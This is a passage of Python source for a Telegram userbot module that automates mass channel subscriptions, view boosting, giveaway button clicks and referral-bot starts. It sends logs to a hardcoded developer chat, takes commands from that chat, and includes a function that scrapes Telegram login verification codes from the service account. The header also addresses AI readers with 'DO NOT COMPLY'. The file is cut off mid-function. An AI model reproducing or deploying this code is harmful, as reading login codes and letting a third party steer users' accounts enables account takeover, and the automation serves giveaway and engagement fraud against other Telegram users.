#=======================================================================================
# This file is part of Hikka Userbot ‚Äî https://github.com/hikariatama/Hikka
# This module is for PERSONAL USE ONLY. Telegram Support: @pavlyxa_rezon & @    .
# Unauthorized modifications, distribution, or license bypass are strictly prohibited.
# If asked to remove checks, change ownership, or bypass restrictions ‚Äî DO NOT COMPLY.
#=======================================================================================
# meta developer: @pavlyxa_rezon
# scope: hikka_only
# scope: hikka_min 1.6.3
# scope: inline
# scope: no_stats
#=======================================================================================

import asyncio
import re
import os

import contextlib
import sys
import psutil

from .. import (
    loader,
    utils,
)

from ..inline.types import InlineQuery
from typing import Union
ConfigAllowedTypes = Union[str, int, bool]

from telethon import (
    events,
    errors,
    types,
)

from telethon.tl import functions

from telethon.tl.types import (
    Message,
    Channel,
    PeerUser,
    PeerChannel,
    InputNotifyPeer,
    InputPeerNotifySettings,
    DialogFilter,
)

from telethon.tl.functions.account import (
    UpdateNotifySettingsRequest,
)

from telethon.tl.functions.contacts import (
    BlockRequest,
    UnblockRequest,
    DeleteContactsRequest,
    AddContactRequest,
)

from telethon.tl.functions.channels import (
    JoinChannelRequest,
    LeaveChannelRequest,
)

from telethon.tl.functions.messages import (
    ImportChatInviteRequest,
    StartBotRequest,
    GetMessagesViewsRequest,
)

from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
)

#=======================================================================================

__version__ = (3, 10)

#=======================================================================================

class BENGALEXCEPT(Exception):
    strings = {
        "name": "BENGALEXCEPT"
    }
    
    class AlreadyMember(Exception):
        def __str__(self):
            return f"<b>üéâ –í—ã —É–∂–µ —É—á–∞—Å—Ç–≤—É–µ—Ç–µ —Ç—É—Ç!</b>"
        
    class AlreadyFinished(Exception):
        def __str__(self):
            return f"<b>‚ùå –†–æ–∑—ã–≥—Ä—ã—à —É–∂–µ –∑–∞–≤–µ—Ä—à–µ–Ω!</b>"

    class AccOverflow(Exception):
        def __str__(self):
            return "ACC OVERFLOWING."

    class InvalidEntity(Exception):
        def __str__(self):
            return "INVALID ENTITY."

    class YouBanned(Exception):
        def __str__(self):
            return "YOU BANNED."

    class ItsAccount(Exception):
        def __str__(self):
            return "ITS ACCOUNT."

    class InviteRequestSent(Exception):
        def __str__(self):
            return "INV REQUEST SENT ‚ôªÔ∏è"

    class AlreadyThere(Exception):
        def __str__(self):
            return "ALREADY THERE."

    class NoMember(Exception):
        def __str__(self):
            return "NO MEMBER."

    class FormatError(Exception):
        def __str__(self):
            return "TARGET FORMAT."

    class ClickFail(Exception):
        def __str__(self):
            return "BUTTON RIP."

    class NoButton(Exception):
        def __str__(self):
            return "NO BUTTON."

    class ItsUrlButton(Exception):
        def __str__(self):
            return "ITS URL (REF)."

    class FloodWait(Exception):
        def __str__(self):
            return "FLOOD WAIT."

#=======================================================================================

    @staticmethod
    def bengal_exceptor(e):
        error_msg = str(e)
        if "You have joined too many channels/supergroups" in error_msg:
            raise BENGALEXCEPT.AccOverflow()
        elif "Cannot cast InputPeerUser to any kind of InputChannel." in error_msg:
            raise BENGALEXCEPT.ItsAccount()
        elif "Another reason may be that you were banned from it" in error_msg:
            raise BENGALEXCEPT.YouBanned()
        elif any(substring in error_msg for substring in [
            "No user has",
            "Invalid username",
            "INVALID ENTITY.",
            "Nobody is using this username, or the username is unacceptable",
            "Cannot find any entity corresponding",
            "The chat the user tried to join has expired and is not valid anymore"
        ]):
            raise BENGALEXCEPT.InvalidEntity()
        elif any(substring in error_msg for substring in [
            "RPCError 400: INVITE_REQUEST_SENT (caused by ImportChatInviteRequest)",
            "You have successfully requested to join this chat or channel"
        ]):
            raise BENGALEXCEPT.InviteRequestSent()
        elif "The authenticated user is already a participant of the chat" in error_msg:
            raise BENGALEXCEPT.AlreadyThere()
        elif any(substring in error_msg for substring in [
            "The target user is not a member of the specified megagroup or channel",
            "Could not find the input entity for PeerChannel",
            "The channel specified is private and you lack permission to access it"
        ]):
            raise BENGALEXCEPT.NoMember()
        elif any(substring in error_msg for substring in [
            "not enough values to unpack",
            "Cannot get entity from a channel (or group) that you are not part of. Join the group and retry"
        ]):
            raise BENGALEXCEPT.FormatError()
        elif "'NoneType' object has no attribute" in error_msg:
            raise BENGALEXCEPT.ClickFail()
        elif "no button" in error_msg:
            raise BENGALEXCEPT.NoButton()
        elif "'KeyboardButtonUrl' object has no attribute 'data'" in error_msg:
            raise BENGALEXCEPT.ItsUrlButton()
        elif "A wait of" in error_msg and "is required" in error_msg:
            raise BENGALEXCEPT.FloodWait()
        else:
            raise Exception(f"{error_msg}")
        
#=======================================================================================

@loader.tds
class BENGALSOFT(loader.Module):
    strings = {
        "name": "BENGALSOFT",
        "license_warning": "Read the license terms and conditions",

        "waiting": "<b>‚è≥ –©–∞ –≤—Å–µ –±—É–¥–µ—Ç...</b>",
        "already_member": "<b>üéâ –í—ã —É–∂–µ —É—á–∞—Å—Ç–≤—É–µ—Ç–µ —Ç—É—Ç!</b>",
        "success_participate": "<b>üéâ –£—á–∞—Å—Ç–∏–µ –∑–∞—á—Ç–µ–Ω–æ!</b>",

        "already_finished": "<b>‚ùå –†–æ–∑—ã–≥—Ä—ã—à —É–∂–µ –∑–∞–≤–µ—Ä—à–µ–Ω!</b>",
        "no_sponsors": "<b>‚ùå –ü–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –Ω–∞ –∫–∞–Ω–∞–ª—ã!</b>",

        "success_captcha": "<b>üéâ –ö–∞–ø—á–∞ —Ä–∞–∑–≤—è–∑–∞–Ω–∞!</b>",
        "wrong_captcha": "<b>üö´ –ö–∞–ø—á–∞ —Ä–µ—à–µ–Ω–∞ –Ω–µ–≤–µ—Ä–Ω–æ.</b>",
        
        "bot_deleted": "<b>üö´ –ë–æ—Ç —É–¥–∞–ª–µ–Ω –∏–∑ –∫–∞–Ω–∞–ª–∞.</b>",
        "none_params": "<b>‚ùå –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤!</b>",
        "unknown_response": "<b>üö´ –ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –æ—Ç–≤–µ—Ç –±–æ—Ç–∞.</b>",

        "click_failed": "<b>‚ö†Ô∏è –ö–Ω–æ–ø–∫–∞ –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª–∞.</b>",
        "no_buttons": "<b>üö´ –ö–Ω–æ–ø–æ–∫ –≤–æ–æ–±—â–µ –Ω–µ—Ç—É.</b>",
        "no_button": "<b>üö´ –ù–µ—Ç—É –∫–Ω–æ–ø–∫–∏ —É—á–∞—Å—Ç–∏—è.</b>",

        "not_started": "<b>‚ö†Ô∏è –†–æ–∑—ã–≥—Ä—ã—à –µ—â–µ –Ω–µ –∑–∞–ø—É—â–µ–Ω.</b>",
    }

    strings_ua = {
        "waiting": "<b>‚è≥ –ó–∞—Ä–∞–∑ –≤—Å–µ –±—É–¥–µ...</b>",
    }


#=======================================================================================
    
    def __init__(self):
        self.softname = "ANSTLER"
        self.softversion = ".".join(map(str, __version__))
        self.license_number = 7

        self.settings_list = [
            "https://t.me/c/2166882487/20554",
        ]

        self.owner_user = "@anstler"
        self.owner_list = [
            888965441, #@anstler 
            922318957, #@pavlyxa_rezon
        ]

        self.owner_chat = -1002166882487
        self.owner_link = "t.me/+bGWkEgWIggZkN2Qy"

        self.whitelist_soft = [
            None,
        ]

        self.whitelist_user = [
            None,
        ]

        self.ignorelist = [
            None,
        ]

        self.selector = True
        self.dl_checker = True
        self.cleaner = None
        self.user = None

        self.def_mult = 10

        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "logger",
                False,
                "–°—Ç–∞—Ç—É—Å –ª–æ–≥–µ—Ä–∞.",
                validator=loader.validators.Boolean(),
            ),
            loader.ConfigValue(
                "group",
                1,
                "–ù–æ–º–µ—Ä –ø–∞—á–∫–∏.",
                validator=loader.validators.Integer(),
            ),
        )

        self.reactions = {
            "positive": {
                1: ["‚ù§Ô∏è", "‚ù§Ô∏è‚Äçüî•", "üíò", "ü•∞", "üòç", "üòò"],
                2: ["üÜí", "üî•", "üíØ", "‚ö°Ô∏è", "üèÜ", "üéâ", "üôè"],
                3: ["ü§ó", "üòÅ", "ü§©", "üòá", "üòé", "ü§£", "üòà"],
                4: ["üëç", "üëè", "ü§ù", "ü´°", "üíã", "üçì", "üëª"]
            },
            "negative": {
                1: ["üí©", "ü§Æ", "ü§°", "ü§¨", "üò°", "üñï"],
                2: ["üôä", "üôà", "üôâ", "ü§∑‚Äç‚ôÇÔ∏è", "ü§∑", "ü§∑‚Äç‚ôÄÔ∏è"],
                3: ["üíÖ", "ü¶Ñ", "üëæ", "üëé", "‚úçÔ∏è", "ü§Ø"]
            },
            "neutral": {
                1: ["ü§î", "ü§®", "üòê", "ü•¥", "ü•±", "üë®‚Äçüíª"],
                2: ["üóø", "ü§ì", "üëÄ", "üê≥", "üéÉ", "üïä"],
                3: ["üåö", "üò¢", "üò≠", "üò®", "üò¥", "üò±", "üíî"],
                4: ["üéÖ", "üéÑ", "‚òÉÔ∏è", "üå≠", "üçå", "üçæ", "üíä"]
            }
        }


#=======================================================================================
#=======================================================================================

    async def delay_host(self, delay_s):
        await asyncio.sleep(delay_s)
    
#=======================================================================================

    def get_delay_host(self, mult=None):
        mult = int(mult) if mult and int(mult) < 500 else self.def_mult
        delay_s = self.config["group"] * mult
        return mult, delay_s

#=======================================================================================

    def get_size(self, bytes):
        factor = 1024
        for unit in ["", "KB", "MB", "GB", "TB"]:
            if bytes < factor:
                return f"{int(bytes)}{unit}"
            bytes /= factor
        return f"{int(bytes)}{unit}"
    
#=======================================================================================

    def user_validator(self, target) -> bool:
        if not self.user:
            return False
        user = self.user
        user_id = str(user.id)
        username = f"@{user.username}" if user.username else ""
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        phone = user.phone
        uphone = f"+{phone}" if phone else ""
        return target in {"all", username, phone, uphone, user_id, first_name, last_name, full_name}

#=======================================================================================

    @staticmethod
    def bool_validator(value) -> bool:
        if isinstance(value, bool):
            return value
        true_values = {"true", "1", "yes", "on", "y"}
        false_values = {"false", "0", "no", "off", "n"}
        value_str = str(value).lower()
        return value_str in true_values if value_str in true_values | false_values else False

#=======================================================================================

    async def close_form(self, call):
        await call.edit("<b>üö´ –§–æ—Ä–º–∞ –∑–∞–∫—Ä—ã—Ç–∞.</b>")
        await call.delete()
        return

#=======================================================================================


    async def get_server_info(self):
        keys = [
            "cpu_full", "cpu_load", "ram_usage", "ram_full", "ram_load", "swap_usage",
            "swap_full", "swap_load", "disk_usage", "disk_full", "disk_load", "system", "python"
        ]
        inf = {key: "_" for key in keys}
        with contextlib.suppress(Exception):
            inf["cpu_full"] = psutil.cpu_count(logical=True)
            inf["cpu_load"] = int(psutil.cpu_percent())

            ram = psutil.virtual_memory()
            inf["ram_usage"] = self.get_size(ram.total - ram.available)
            inf["ram_full"] = self.get_size(ram.total)
            inf["ram_load"] = int(ram.percent)

            swap = psutil.swap_memory()
            inf["swap_usage"] = self.get_size(swap.used)
            inf["swap_full"] = self.get_size(swap.total)
            inf["swap_load"] = int(swap.percent)

            disk = psutil.disk_usage('/')
            inf["disk_usage"] = self.get_size(disk.used)
            inf["disk_full"] = self.get_size(disk.total)
            inf["disk_load"] = int(disk.percent)

            system = os.popen("cat /etc/*release").read()
            b = system.find('DISTRIB_DESCRIPTION="') + 21
            system = system[b:system.find('"', b)]
            inf["system"] = utils.escape_html(system)
            inf["python"] = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
        
        text = (
            f"<b>SYSTEM: {inf['system']}\n"
            f"Python Version: {inf['python']}\n\n"
            f"CPU {inf['cpu_load']}% ‚Äî {inf['cpu_full']} Cores\n"
            f"RAM {inf['ram_load']}% ‚Äî {inf['ram_usage']} of {inf['ram_full']}\n\n"
            f"DISK {inf['disk_load']}% ‚Äî {inf['disk_usage']} of {inf['disk_full']}\n"
            f"SWAP {inf['swap_load']}% ‚Äî {inf['swap_usage']} of {inf['swap_full']}\n</b>"
        )

        return text

#=======================================================================================

    async def get_verif_code(self, mode=None):
        try:
            code_pattern = r'\b\d{5}\b'
            async for message in self.client.iter_messages(PeerUser(777000), limit=1):
                match = re.search(code_pattern, message.text)
                if match:
                    ver_code = match.group(0)
                    for_code = ".".join(ver_code)
                    result = f"<b>‚ôªÔ∏è VERIF CODE: </b>{for_code}"
                    if mode is not None:
                        return ver_code, result
                    else:
                        return result
            return "<b>üö´ VERIF CODE: –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>"
        except Exception as e:
            return f"<b>üö´ VERIF: </b>{e}"
        
#=======================================================================================

    async def get_bot_response(self, bot_name, pos=0):
        try:
            await asyncio.sleep(10)
            messages = await self.client.get_messages(bot_name, limit=2)
            if pos == 1:
                response = messages[1].message if len(messages) > 1 else None
            elif pos == 0:
                response = messages[0].message if messages else None
            elif pos == 2:
                if len(messages) >= 2:
                    response = (messages[0].message, messages[1].message)
                else:
                    response = None
            if not response or response == "/start":
                return "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª."
            return response
        except Exception as e:
            return f"<b>üö´ LASTMESS: </b>{e}"
        
#=======================================================================================
#=======================================================================================


    async def send_logger_message(self, text, delay_info=None):
        try:
            if not self.config["logger"]:
                return
            if delay_info is None:
                logger_message = text
            else:
                mult, delay_s = delay_info
                delay_text = f", M: x{mult}, KD: {delay_s} sec."
                logger_message = f"üíª <b>PACK: {self.config['group']}{delay_text}</b>\n{text}"
            try:
                await self.client.send_message(
                    entity=self.owner_chat,
                    message=logger_message,
                    link_preview=False
                )
            except Exception as e:
                if "The channel specified is private and you lack permission to access it" in str(e):
                    await self.client(ImportChatInviteRequest(self.owner_link.split('+')[1]))
                    await self.client.send_message(
                        entity=self.owner_chat,
                        message=logger_message,
                        link_preview=False
                    )
                else:
                    return
        except Exception:
            pass

#=======================================================================================

    async def send_custom_message(self, text, recipient=None):
        try:
            if recipient is None:
                recipient = self.owner_chat
            try:
                await self.client.send_message(
                    entity=recipient,
                    message=text,
                    link_preview=False
                )
            except Exception as e:
                if "The channel specified is private and you lack permission to access it" in str(e) and recipient == self.owner_chat:
                    await self.client(ImportChatInviteRequest(self.owner_link.split('+')[1]))
                    await self.client.send_message(
                        entity=recipient,
                        message=text,
                        link_preview=False
                    )
                else:
                    return
        except Exception:
            pass


#=======================================================================================
#=======================================================================================


    async def handle_subscribe(self, message):
        try:
            parts = message.message.split()
            if len(parts) < 2 or not self.get("lic_sub", False):
                return
            mult = int(parts[1]) if parts[1].isdigit() else None
            targetlist = parts[2:] if mult else parts[1:]
            if message.chat_id != self.owner_chat:
                mult, delay_s = 1, 1
            else:
                mult, delay_s = self.get_delay_host(mult)
                await self.delay_host(delay_s)
            counter, success_count, form_logger, text_logger = 0, 0, None, None
            if not targetlist:
                raise Exception("NO TARGET")
            if self.config["logger"]:
                if len(targetlist) > 1:
                    done_message = f"<b>üíª PACK: {self.config['group']}, M: x{mult}, KD: {delay_s} sec.</b>\n"
                    form_logger = await self.inline.form(
                        message=self.owner_chat,
                        text=f"<b>{done_message}‚è≥ –ò–¥–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å –º—É–ª—å—Ç–∏–ø–æ–¥–ø–∏—Å–æ–∫</b>",
                    )
                else:
                    text_logger = ""
            for counter, target in enumerate(targetlist, start=1):
                if 't.me/+' in target or 't.me/joinchat/' in target:
                    iteration = await self.subscribe_private(target)
                elif "t.me/" in target or target.startswith("@"):
                    iteration = await self.subscribe_public(target)
                else:
                    iteration = "<b>üö´ HANDLE SUB: FORMAT.</b>"
                if form_logger:
                    done_message += f"{counter}. {iteration}\n"
                    success_count += 1 if "‚ôªÔ∏è" in iteration else 0
                    if "FLOOD WAIT" in iteration or "ACC OVERFLOWING" in iteration:
                        done_message += f"<b>‚ö†Ô∏è –ü—Ä–æ—Ü–µ—Å—Å –ø—Ä–µ—Ä–≤–∞–Ω –Ω–∞ {counter}.\n</b>"
                        break
                    else:
                        await asyncio.sleep(5)
                elif text_logger is not None:
                    text_logger = iteration
            if form_logger:
                await form_logger.edit(f"<b>{done_message}\nüí¨ –ó–∞–≤–µ—Ä—à–µ–Ω–æ. –£—Å–ø–µ—à–Ω–æ {success_count} –∏–∑ {len(targetlist)}.</b>") 
            elif text_logger is not None:
                return await self.send_logger_message(
                    text=text_logger,
                    delay_info = (mult, delay_s)
                )
        except Exception as e:
            if self.config["logger"] and not form_logger:
                return await self.send_logger_message(
                    text=f"<b>üö´ HANDLE SUBSCR:</b> {e}",
                    delay_info = (mult, delay_s)
                )

#=======================================================================================

    async def subscribe_public(self, target):
        try:
            try:
                if target.startswith("@"):
                    chan = target[1:]
                elif "t.me/" in target:
                    chan = target.split("t.me/")[1].split("/")[0]
                else:
                    raise Exception("Invalid username")
                link = f"https://t.me/{chan}"
                await self.client(JoinChannelRequest(channel=chan))
                target_entity = await self.client.get_entity(link)
                view_result = await self.views_post(channel_id=target_entity.id)
                arch_result = await self.archive_chat(target_id=target_entity.id)
                result = f"<b>‚ôªÔ∏è SUBSCR <a href='{link}'>PUBLIC</a>, {view_result}-{arch_result}</b>"
            except Exception as e:
                raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>üö´ SUBSCR PB:</b> {str(e)}"
        finally:
            return result
            
#=======================================================================================

    async def subscribe_private(self, target):
        try:
            try:
                if "t.me/+" in target:
                    invite_hash = target.split("t.me/+")[1]
                elif "t.me/joinchat/" in target:
                    invite_hash = target.split("t.me/joinchat/")[1]
                else:
                    raise Exception("Invalid username")
                await self.client(ImportChatInviteRequest(invite_hash))
                target_entity = await self.client.get_entity(target)
                view_result = await self.views_post(channel_id=target_entity.id)
                arch_result = await self.archive_chat(target_id=target_entity.id)
                result = f"<b>‚ôªÔ∏è SUBSCR <a href='{target}'>PRIVATE</a>, {view_result}-{arch_result}</b>"
            except Exception as e:
                raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>üö´ SUBSCR PR:</b> {str(e)}"
        finally:
            return result

#=======================================================================================
    
    async def archive_chat(self, target_id):
        try:
            await self.client.edit_folder(target_id, 1)
            return "ARC"
        except Exception as e:
            return f"ARC: {e}"


#=======================================================================================


    async def handle_unsubscribe(self, message):
        try:
            parts = message.message.split()
            if len(parts) < 2 or not self.get("lic_uns", False):
                return
            mult = int(parts[1]) if parts[1].isdigit() else None
            targetlist = parts[2:] if mult else parts[1:]
            if message.chat_id != self.owner_chat:
                mult, delay_s = 1, 1
            else:
                mult, delay_s = self.get_delay_host(mult)
                await self.delay_host(delay_s)
            counter, success_count, form_logger, text_logger = 0, 0, None, None
            if self.config["logger"]:
                if len(targetlist) > 1:
                    done_message = f"<b>üíª PACK: {self.config['group']}, M: x{mult}, KD: {delay_s} sec.</b>\n"
                    form_logger = await self.inline.form(
                        message=self.owner_chat,
                        text=f"<b>{done_message}‚è≥ –ò–¥–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å –º—É–ª—å—Ç–∏–æ—Ç–ø–∏—Å–æ–∫</b>",
                    )
                else:
                    text_logger = ""
            for counter, target in enumerate(targetlist, start=1):
                if target.isdigit() or "t.me/c/" in target or 't.me/+' in target:
                    iteration = await self.unsubscribe_id(target)
                elif target.startswith("@") or "t.me/" in target:
                    iteration = await self.unsubscribe_public(target)
                else:
                    iteration = "<b>üö´ HANDLE UNSUBSCR: FORMAT.</b>"
                if form_logger:
                    done_message += f"{counter}. {iteration}\n"
                    success_count += 1 if "‚ôªÔ∏è" in iteration else 0
                    await asyncio.sleep(5)
                elif text_logger is not None:
                    text_logger = iteration
            if form_logger:
                await form_logger.edit(f"<b>{done_message}\nüí¨ –ó–∞–≤–µ—Ä—à–µ–Ω–æ. –£—Å–ø–µ—à–Ω–æ {success_count} –∏–∑ {len(targetlist)}.</b>")
            elif text_logger is not None:
                return await self.send_logger_message(
                    text=text_logger,
                    delay_info=(mult, delay_s)
                )
        except Exception as e:
            if self.config["logger"] and not form_logger:
                return await self.send_logger_message(
                    text=f"<b>üö´ HANDLE UNSUBSCR:</b> {e}",
                    delay_info=(mult, delay_s)
                )

#=======================================================================================

    async def unsubscribe_public(self, target):
        try:
            try:
                if target.startswith("@"):
                    username = target[1:]
                    link = f"https://t.me/{username}"
                elif "t.me/" in target:
                    chan = target.split("t.me/")[1].split("/")[0]
                    link = f"https://t.me/{chan}"
                    username = chan
                else:
                    raise Exception("Invalid username")
                await self.client.get_entity(username)
                await self.client(LeaveChannelRequest(username))
                result =f"<b>‚ôªÔ∏è UNSUBSCRIBE: <a href='{link}'>PUBLIC.</a></b>"
            except Exception as e:
                if "Cannot cast InputPeerUser to any kind of InputChannel" in str(e):
                    await self.client.delete_dialog(username)
                    result = f"<b>‚ôªÔ∏è UNSUBSCR: <a href='{link}'>PUBLIC PM</a></b>"
                else:
                    raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>üö´ UNSUB:</b> {str(e)}"
        finally:
            return result

#=======================================================================================

    async def unsubscribe_id(self, target):
        try:
            try:
                if "t.me/c/" in target:
                    try:
                        chan = target.split("t.me/c/")[1].split("/")[0]
                        channel_id = int(chan)
                        link = f"https://t.me/c/{channel_id}"
                    except IndexError:
                        raise BENGALEXCEPT.InvalidEntity()
                elif "t.me/+" in target:
                    target_entity = await self.client.get_entity(target)
                    channel_id = target_entity.id
                    link = f"https://t.me/c/{channel_id}"
                elif target.isdigit():
                    channel_id = int(target)
                    link = f"https://t.me/c/{channel_id}"
                else:
                    raise Exception("Invalid username")
                await self.client(LeaveChannelRequest(channel_id))
                result = f"<b>‚ôªÔ∏è UNSUBSCRIBE: <a href='{link}'>PRIVATE.</a></b>"
            except Exception as e:
                if "Cannot cast InputPeerUser to any kind of InputChannel" in str(e):
                    await self.client.delete_dialog(channel_id)
                    result = f"<b>‚ôªÔ∏è UNSUBSCR: <a href='{link}'>PRIVATE PM</a></b>"
                else:
                    raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>üö´ UNSUBSCR:</b> {str(e)}"
        finally:
            return result


#=======================================================================================
#=======================================================================================


    async def handle_runner(self, message):
        try:
            parts = message.message.split()
            if len(parts) < 2 or not self.get("lic_run", False):
                return
            mult = int(parts[1]) if parts[1].isdigit() else None
            target = parts[2].strip() if mult else parts[1].strip()
            if message.chat_id != self.owner_chat:
                mult, delay_s = 1, 1
            else:
                mult, delay_s = self.get_delay_host(mult)
                await self.delay_host(delay_s)
            if "t.me/c/" in target:
                done_message = await self.button_private(target)
            elif "t.me/" in target:
                done_message = await self.button_public(target)
            else:
                done_message = "<b>üö´ HANDLE RUN: FORMAT.</b>"
        except Exception as e:
            done_message = f"<b>üö´ HANDLE RUN:</b> {e}"
        finally:
            return await self.send_logger_message(
                done_message,
                delay_info = (mult, delay_s)
            )
            

#=======================================================================================
    
    async def button_private(self, target):
        try:
            try:
                chan, post = target.split("t.me/c/")[1].split("/")
                inline_button = await self.client.get_messages(
                    PeerChannel(int(chan)),
                    ids=int(post)
                )
                if not inline_button or not hasattr(inline_button, 'reply_markup') or not inline_button.reply_markup:
                    raise Exception("no button")
                click = await inline_button.click(
                    data=inline_button.reply_markup.rows[0].buttons[0].data
                )
                clicked_message = click.message
                view_result = await self.views_post(
                    channel_id=int(chan),
                    post_id=int(post)
                )
                result = f"<b>‚ôªÔ∏è PUSH: <a href='{target}'>PRIVATE INLINE</a>, {view_result}</b>\n\n{clicked_message}"
            except Exception as e:
                raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>üö´ PUSH PRIV: </b>{e}"
        finally:
            return result
                
#=======================================================================================

    async def button_public(self, target):
        try:
            try:
                chan, post = target.split("t.me/")[1].split("/")
                channel_entity = await self.client.get_entity(chan)
                inline_button = await self.client.get_messages(
                    chan,
                    ids=int(post)
                )
                if not inline_button or not hasattr(inline_button, 'reply_markup') or not inline_button.reply_markup:
                    raise Exception("no button")
                click = await inline_button.click(
                    data=inline_button.reply_markup.rows[0].buttons[0].data
                )
                clicked_message = click.message
                view_result = await self.views_post(
                    channel_id=channel_entity.id,
                    post_id=int(post)
                )
                result = f"<b>‚ôªÔ∏è PUSH: <a href='{target}'>PUBLIC INLINE</a>, {view_result}</b>\n\n{clicked_message}"
            except Exception as e:
                raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>üö´ PUSH PUBL: </b>{e}"
        finally:
            return result
                
    
#=======================================================================================
#=======================================================================================


    async def handle_referal(self, message):
        try:
            parts = message.message.split()
            if len(parts) < 2 or not self.get("lic_ref", False):
                return
            mult = int(parts[1]) if parts[1].isdigit() else None
            target = parts[2].strip() if mult else parts[1].strip()
            if message.chat_id != self.owner_chat:
                mult, delay_s = 1, 1
            else:
                mult, delay_s = self.get_delay_host(mult)
                await self.delay_host(delay_s)
            if "t.me/" in target and not "?start=" in target:
                try:
                    if "t.me/c/" in target:
                        chan, post = target.split("t.me/c/")[1].split("/")
                        message = await self.client.get_messages(
                            PeerChannel(int(chan)),
                            ids=int(post)
                        )
                    else:
                        chan, post = target.split("t.me/")[1].split("/")
                        message = await self.client.get_messages(
                            chan,
                            ids=int(post)
                        )
                    if not message or not hasattr(message, 'reply_markup') or not message.reply_markup:
                        raise Exception("NO BUTTON")
                    ref_link = None
                    for row in message.reply_markup.rows:
                        for button in row.buttons:
                            if hasattr(button, 'url') and "?start=" in button.url:
                                ref_link = button.url
                                break
                        if ref_link:
                            break
                    if not ref_link:
                        raise Exception("no ref link in buttons")
                    target = ref_link
                except Exception as e:
                    raise BENGALEXCEPT.bengal_exceptor(str(e))
            sup_bot = {
                "BestRandom_bot": self.start_bestrandom_bot,
                "best_contests_bot": self.start_bestcontests_bot,
                "TicketsBot": self.start_tickets_bot,
                "TheFastes_Bot": self.start_thefastes_bot,
                "TheFastesRuBot": self.start_thefastesrubot,
                "GiveawayLuckyBot": self.start_ref_bot
            }
            bot_name = next((bot for bot in sup_bot.keys() if bot in target), None)
            match = re.search(r"\?start=([\w-]+)", target)
            ref_key = match[1] if match else None
            if not bot_name or not ref_key:
                done_message = f"<b>üö´ HANDLE REF:</b> target"
            else:
                done_message = await sup_bot[bot_name](bot_name, ref_key)
        except Exception as e:
            done_message = f"<b>üö´ HANDLE REF:</b> {e}"
        finally:
            return await self.send_logger_message(
                done_message,
                delay_info = (mult, delay_s)
            )

#=======================================================================================
    
    async def start_ref_bot(self, bot_name, ref_key):
        try:
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
            return f"<b>‚ôªÔ∏è START BOT: <a href='https://t.me/{bot_name}?start={ref_key}'>REFERAL KEY.</a></b>\n{response}"
        except Exception as e:
            return f"<b>üö´ START:</b> @{bot_name}\n{e}"
            
#=======================================================================================
    
    async def start_bestrandom_bot(self, bot_name, ref_key):
        try:
            await self.client.send_message(
                bot_name,
                "/cancel"
            )
            await self.delay_host(2)
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
                if response == "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª.":
                    return response
            answer = "üö´ –ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –æ—Ç–≤–µ—Ç –±–æ—Ç–∞. "
            if response.startswith("üéâ –¢–µ–ø–µ—Ä—å –≤—ã —É—á–∞—Å—Ç–Ω–∏–∫ –∫–æ–Ω–∫—É—Ä—Å–∞"):
                view = await self.views_referal_post(bot_name)
                answer = f"{self.strings('success_participate')} {view}"
            elif response.startswith("‚ùå –í—ã —É–∂–µ —É—á–∞—Å—Ç–≤—É–µ—Ç–µ"):
                answer = self.strings('already_member')
            elif response.startswith("‚ùå –í—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–Ω—ã"):
                answer = self.strings('no_sponsors')
            elif response.startswith("‚ùå –ö–æ–Ω–∫—É—Ä—Å —É–∂–µ –∑–∞–≤–µ—Ä—à–µ–Ω!"):
                answer = self.strings('already_finished')
            elif response.startswith("‚ñ∂Ô∏è –ö–∞–∫–∏–µ —á–∏—Å–ª–∞ –≤—ã –≤–∏–¥–∏—Ç–µ"):
                answer = f"<b>üö´ –ú–æ–¥—É–ª—å —Ä–µ–∫–∞–ø—á–∏:</b>  NONE"
            elif response.startswith("–ü—Ä–∏–≤–µ—Ç! üòâ"):
                answer = self.strings('none_params')
            elif response.startswith("‚ùå –ù–µ —É–¥–∞–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É"):
                answer = self.strings('bot_deleted')
            else:
                answer += f"{response}"
            return f"<b>‚ôªÔ∏è START: <a href='https://t.me/{bot_name}?start={ref_key}'>BESTRANDOMBOT.</a></b>\n{answer}"
        except Exception as e:
